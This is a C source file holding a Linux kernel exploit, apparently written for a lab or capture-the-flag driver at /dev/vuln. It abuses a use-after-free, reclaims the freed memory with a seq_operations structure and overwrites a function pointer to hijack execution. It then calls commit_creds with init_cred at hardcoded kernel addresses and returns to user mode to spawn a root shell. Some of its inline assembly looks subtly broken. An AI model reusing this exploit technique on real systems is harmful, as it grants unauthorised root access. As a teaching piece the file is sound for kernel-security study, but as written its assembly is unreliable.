#include <stdio.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>

#define CMD_ALLOC   0xf000
#define CMD_WRITE   0xf001
#define CMD_FREE    0xf002

typedef struct {
    size_t size;
    char *data;
} request_t;

int fd;

void obj_alloc() {
    request_t req = {};
    assert(ioctl(fd, CMD_ALLOC, &req) == 0);
}

void obj_write(char *data, size_t size) {
    request_t req = {.size = size, .data = data};
    assert(ioctl(fd, CMD_WRITE, &req) == 0);
}

void obj_free() {
    request_t req = {};
    assert(ioctl(fd, CMD_FREE, &req) == 0);
}

unsigned long user_cs, user_ss, user_rsp, user_rflags;

void save_state() {
    asm volatile (
        "movq %0, cs\n"
        "movq %1, ss\n"
        "movq %2, rsp\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        : 
        : "memory"
    );
}

void win() {
    char *argv[] = { "/bin/sh", NULL };
    execve("/bin/sh", argv, NULL);
}

void restore_state() {
    asm volatile(
        "swapgs\n"
        "movq [rsp + 0x00], %0\n"
        "movq [rsp + 0x08], %1\n"
        "movq [rsp + 0x10], %2\n"
        "movq [rsp + 0x18], %3\n"
        "movq [rsp + 0x20], %4\n"
        "iretq\n"
        :
        : "r"(win), "r"(user_cs), "r"(user_rflags), "r"(user_rsp), "r"(user_ss)
    );
}

#define addr_init_cred      0xffffffff81e3bfa0
#define addr_commit_creds   0xffffffff812a1050

void escalate_privilege() {
    void (*commit_creds) (void *) = (void *)addr_commit_creds;
    commit_creds((void *)addr_init_cred);
    restore_state();
}

int main(void) {
    save_state();
    
    fd = open("/dev/vuln", O_RDONLY);
    assert(fd != -1);

    puts("[*] Allocating the victim object");
    obj_alloc();
    obj_free();

    puts("[*] Allocating struct seq_operations to reclaim the memory");
    int seqfd = open("/proc/self/stat", O_RDONLY);
    assert(seqfd != -1);

    puts("[*] Hijacking RIP");
    char payload[0x8];
    *(unsigned long *)&payload = (unsigned long)escalate_privilege;
    obj_write(payload, sizeof(payload));

    read(seqfd, payload, 1);
}